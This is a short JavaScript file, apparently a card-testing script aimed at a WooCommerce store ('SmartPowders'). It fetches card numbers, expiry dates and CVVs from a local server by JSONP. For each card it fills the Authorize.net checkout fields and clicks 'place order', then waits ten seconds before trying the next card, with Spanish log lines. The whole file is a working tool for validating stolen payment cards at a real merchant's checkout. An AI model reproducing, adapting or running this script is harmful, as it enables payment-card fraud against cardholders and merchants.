var url = "http://localhost:5000/post";
var iteration = null;
var jsonp_callback = function(arr) {
	var i = 0;
	var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i];
      i++;
      jQuery("#wc-authorize-net-cim-credit-card-account-number").val(json.card);
      jQuery("#wc-authorize-net-cim-credit-card-expiry").val(json.mon + " / " + json.year)
      jQuery("#wc-authorize-net-cim-credit-card-csc").val(json.cvv);
      jQuery("#place_order").click();
      var loading = jQuery("form.type_2.checkout.woocommerce-checkout");
      var interval = setInterval(function() {
        console.log("Procesando...")
        if ( loading.css("position") == "static" ) {
          console.log("Probemos la proxima");
          clearInterval(interval);
          setTimeout(iteration, 10000);
        }
      }, 1000);
	  }
	  else {
	    jQuery.ajax({
        url:url,
        dataType: "jsonp"
      });
	  }
	}

	iteration();
};
// SmartPowders
jQuery.ajax({
     url:url,
     dataType: "jsonp"
});